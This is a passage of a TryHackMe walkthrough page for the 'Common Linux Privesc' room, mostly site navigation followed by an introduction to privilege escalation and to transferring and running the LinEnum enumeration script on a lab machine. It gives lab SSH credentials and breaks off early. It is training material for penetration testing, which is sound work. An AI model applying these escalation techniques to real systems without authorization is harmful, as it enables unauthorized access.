href="/writeups/Tryhackme/Linux Local Enumeration/">Linux: Local Enumeration</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Linux PrivEsc/ Linux PrivEsc/">Linux PrivEsc</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Looking Glass/">Looking Glass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Madness/">Madness</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Magician/">Magician</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Metaspliot/Metasploit/">Metaspliot</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mindgames/">Mindgames</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Misguided Ghosts/Misguided Ghost/">Misguided Ghosts</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mnemonic/">Mnemonic</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Motunui/">Motunui</a><button aria-label="Toggle the collapsible sidebar category &#x27;Motunui&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Mr Robot CTF/">Mr Robot CTF</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Musical Stego/ Musical Stego/">Musical Stego</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/NIS - Linux Part I/">NIS - Linux Part I</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nax/">Nax</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/NerdHerd/NerdHeard/">NerdHerd</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nessus/">Nessus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Network Services/">Network Services</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Networking/">Networking</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ninja Skills/">Ninja Skills</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Nmap/">Nmap</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP Top 10/">OWASP Top 10</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OWASP ZAP/">Introduction to OWASP ZAP</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/OhSINT/">OhSINT</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/One Piece/">One Piece</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Overpass/">Overpass</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Overpass 2 - Hacked/Overpass 2/">Overpass 2 - Hacked</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/PS Empire/">PS Empire</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Peak Hill/">Peak Hill</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Persistence/">Persistence</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Pickle Rick/">Pickle Rick</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Post-Exploitation Basics/Post Exploitation Basics/">Post-Exploitation Basics</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Poster/">Poster</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Printer Hacking 101/">Printer Hacking 101</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Psycho Break/Pyscho Break/">Psycho Break</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Python Playground/">Python Playground</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra/">Ra</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Ra 2/">Ra 2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Racetrack Bank/">Racetrack Bank</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Recovery/">Recovery</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Relevant/Relevent/">Relevant</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Res/">Res</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Retro/">Retro</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Revenge/">Revenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reverse Engineering/">Reverse Engineering</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Reversing ELF/">Reversing ELF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/RootMe/">RootMe</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/SSRF/">SSRF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Scripting/">Scripting</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Set/">Set</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" tabindex="0" href="/writeups/Tryhackme/Shodan.io/Shodan/">Shodan.io</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Simple CTF/">Simple CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Skynet/">Skynet</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Smag Grotto/">Smag Grotto</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Source/">Source</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Splunk/">Splunk</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Spring/">Spring</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Starting Out In Cyber Sec/">Starting Out In Cyber Sec</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Startup/">Startup</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Steel Mountain/">Steel Mountain</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/StuxCTF/">StuxCTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sublist3r/">Sublist3r</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Buffer Overflow/">Sudo Buffer Overflow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Sudo Security Bypass/">Sudo Security Bypass</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Symfonos6/">symfonos6</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tartarus/">Tartarus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tempus Fugit Durius/">Tempus Fugit Durius</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Blob Blog/">The Blob Blog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Docker Rodeo/">The Docker Rodeo</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Impossible Challenge/">The Impossible Challenge</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Marketplace/">The Marketplace</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The Server From Hell/">The Server From Hell</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/The find command/">The find command</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Thompson/">Thompson</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tmux/">tmux</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tomghost/">tomghost</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tony the Tiger/">Tony the Tiger</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/ToolsRus/">ToolsRus</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tor/">Tor</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Tutorial/">Tutorial</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Undiscovered/">Undiscovered</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Upload Vulnerabilities/">Upload Vulnerabilities</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WWBuddy/">WWBuddy</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Fundamentals/">Web Fundamentals</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Web Scanning/">Web Scanning</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/WebAppSec 101/">WebAppSec 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wgel CTF/">Wgel CTF</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Willow/">Willow</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Windows PrivEsc Arena/">Windows PrivEsc Arena</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wireshark 101/">Wireshark 101</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Wonderland/">Wonderland</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/XXE/">XXE</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Dog/">Year of the Dog</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Fox/">Year of the Fox</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Pig/">Year of the Pig</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Year of the Rabbit/">Year of the Rabbit</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/writeups/Tryhackme/Zero Logon/">Zero Logon</a></li></ul></li></ul></nav><button type="button" title="Collapse sidebar" aria-label="Collapse sidebar" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Tryhackme</span><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Common Linux Privesc</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>Common Linux Privesc</h1><p>A room explaining common Linux privilege escalation</p><p><a href="https://tryhackme.com/room/commonlinuxprivesc" target="_blank" rel="noopener noreferrer">Common Linux Privesc</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="-we-will-cover--the-topics"> We will cover  the topics<a href="#-we-will-cover--the-topics" class="hash-link" aria-label="Direct link to  We will cover  the topics" title="Direct link to  We will cover  the topics"></a></h2><ul><li>Privilege Escalation Fundamentals</li><li>Privilege Escalation Enumeration</li><li>Abusing SUID/GUID</li><li>Exploiting Writeable</li><li>Misconfigured Binaries</li><li>Exploiting Crontab</li><li>Exploiting PATH Variable</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-1-get-connected">Task 1 Get Connected<a href="#task-1-get-connected" class="hash-link" aria-label="Direct link to Task 1 Get Connected" title="Direct link to Task 1 Get Connected"></a></h2><p>Hello and welcome!</p><p>This room will explore common Linux Privilege Escalation vulnerabilities and techniques, but in order to do that, we&#x27;ll need to do a few things first!</p><p>A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room. If you think you&#x27;ll need some help with this, try completing the &#x27;Learn Linux&#x27; room (<a href="https://tryhackme.com/room/zthlinux" target="_blank" rel="noopener noreferrer">https://tryhackme.com/room/zthlinux</a>)</p><ul><li>Deploy the machine</li><li>Connect to the TryHackMe OpenVPN Server (See <a href="https://tryhackme.com/access" target="_blank" rel="noopener noreferrer">https://tryhackme.com/access</a> for help!)</li><li>Make sure you&#x27;re sitting comfortably, and have a cup of Tea, Coffee or Water close!</li></ul><p>Now, let&#x27;s move on!</p><ol><li>Deploy the machine</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-2-understanding-privesc">Task 2 Understanding Privesc<a href="#task-2-understanding-privesc" class="hash-link" aria-label="Direct link to Task 2 Understanding Privesc" title="Direct link to Task 2 Understanding Privesc"></a></h2><p><strong>What does &quot;privilege escalation&quot; mean?</strong></p><p>At it&#x27;s core, Privilege Escalation usually involves going from a lower permission to a higher permission. More technically, it&#x27;s the exploitation of a vulnerability, design flaw or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.</p><p><strong>Why is it important?</strong></p><p>Rarely when doing a CTF or real-world penetration test, will you be able to gain a foothold (initial access) that affords you administrator access. Privilege escalation is crucial, because it lets you gain system administrator levels of access. This allow you to do many things, including:</p><ul><li>Reset passwords</li><li>Bypass access controls to compromise protected data</li><li>Edit software configurations</li><li>Enable persistence, so you can access the machine again later.</li><li>Change privilege of users</li><li>Get that cheeky root flag ;)</li></ul><p>As well as any other administrator or super user commands that you desire.</p><ol><li>Read the information about privilege escalation</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-3-direction-of-privilege-escalation">Task 3 Direction of Privilege Escalation<a href="#task-3-direction-of-privilege-escalation" class="hash-link" aria-label="Direct link to Task 3 Direction of Privilege Escalation" title="Direct link to Task 3 Direction of Privilege Escalation"></a></h2><p><strong>Privilege Tree:</strong></p><p><img loading="lazy" src="https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/tree.png" class="img_ev3q"></p><p><strong>There are two main privilege escalation variants:</strong></p><p><strong>Horizontal privilege escalation:</strong> This is where you expand your reach over the compromised system by taking over a different user who is on the same privilege level as you. For instance, a normal user hijacking another normal user (rather than elevating to super user). This allows you to inherit whatever files and access that user has. This can be used, for example, to gain access to another normal privilege user, that happens to have an SUID file attached to their home directory (more on these later) which can then be used to get super user access. <!-- -->[Travel sideways on the tree]</p><p><strong>Vertical privilege escalation (privilege elevation):</strong> This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised. For local privilege escalation attacks this might mean hijacking an account with administrator privileges or root privileges. <!-- -->[Travel up on the tree]</p><ol><li>Understand the difference between Horizontal and Vertical privilege escalation.</li></ol><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-4-enumeration">Task 4 Enumeration<a href="#task-4-enumeration" class="hash-link" aria-label="Direct link to Task 4 Enumeration" title="Direct link to Task 4 Enumeration"></a></h2><p><strong>What is LinEnum?</strong></p><p>LinEnum is a simple bash script that performs common commands related to privilege escalation, saving time and allowing more effort to be put toward getting root. It is important to understand what commands LinEnum executes, so that you are able to manually enumerate privesc vulnerabilities in a situation where you&#x27;re unable to use LinEnum or other like scripts. In this room, we will explain what LinEnum is showing, and what commands can be used to replicate it.</p><p><strong>Where to get LinEnum</strong></p><p>You can download a local copy of LinEnum from:</p><p><a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank" rel="noopener noreferrer">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh</a></p><p>It&#x27;s worth keeping this somewhere you&#x27;ll remember, because LinEnum is an invaluable tool.</p><p><strong>How do I get LinEnum on the target machine?</strong></p><p>There are two ways to get LinEnum on the target machine. The first way, is to go to the directory that you have your local copy of LinEnum stored in, and start a Python web server using &quot;<code>python3 -m http.server 8000</code>&quot; <!-- -->[1]<!-- -->. Then using &quot;<code>wget</code>&quot; on the target machine, and your local IP, you can grab the file from your local machine <!-- -->[2]<!-- -->. Then make the file executable using the command &quot;<code>chmod +x FILENAME.sh</code>&quot;.</p><p><img loading="lazy" src="https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/1.png" class="img_ev3q"> <!-- -->[1]</p><p><img loading="lazy" src="https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/2.png" class="img_ev3q"> <!-- -->[2]</p><p><strong>Other Methods</strong></p><p>In case you&#x27;re unable to transport the file, you can also, if you have sufficient permissions, copy the raw LinEnum code from your local machine <!-- -->[1]<!-- --> and paste it into a new file on the target, using Vi or Nano <!-- -->[2]<!-- -->. Once you&#x27;ve done this, you can save the file with the &quot;.sh&quot; extension. Then make the file executable using the command &quot;chmod +x FILENAME.sh&quot;. You now have now made your own executable copy of the LinEnum script on the target machine!</p><p><img loading="lazy" src="https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/3.png" class="img_ev3q"> <!-- -->[1]</p><p><img loading="lazy" src="https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Common%20Linux%20Privesc/Resources/4.png" class="img_ev3q"> <!-- -->[2]</p><p><strong>Running LinEnum</strong></p><p>LinEnum can be run the same way you run any bash script, go to the directory where LinEnum is and run the command &quot;<code>./LinEnum.sh</code>&quot;.</p><p><strong>Understanding LinEnum Output</strong></p><p>The LinEnum output is broken down into different sections, these are the main sections that we will focus on:</p><p>Kernel Kernel information is shown here. There is most likely a kernel exploit available for this machine.</p><p>Can we read/write sensitive files: The world-writable files are shown below. These are the files that any authenticated user can read and write to. By looking at the permissions of these sensitive files, we can see where there is misconfiguration that allows users who shouldn&#x27;t usually be able to, to be able to write to sensitive files.</p><p>SUID Files: The output for SUID files is shown here. There are a few interesting items that we will definitely look into as a way to escalate privileges. SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. It allows the file to run with permissions of whoever the owner is. If this is root, it runs with root permissions. It can allow us to escalate privileges. </p><p>Crontab Contents: The scheduled cron jobs are shown below. Cron is used to schedule commands at a specific time. These scheduled commands or tasks are known as cron jobs. Related to this is the crontab command which creates a crontab file containing commands and instructions for the cron daemon to execute. There is certainly enough information to warrant attempting to exploit Cronjobs here.</p><p>There&#x27;s also a lot of other useful information contained in this scan. Lets have a read!</p><ol><li>First, lets SSH into the target machine, using the credentials <code>user3:password</code>. This is to simulate getting a foothold on the system as a normal privilege user.</li></ol><p><code>No answer needed</code></p><ol start="2"><li>What is the target&#x27;s hostname?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user3@polobox:~$ hostname</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">polobox</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 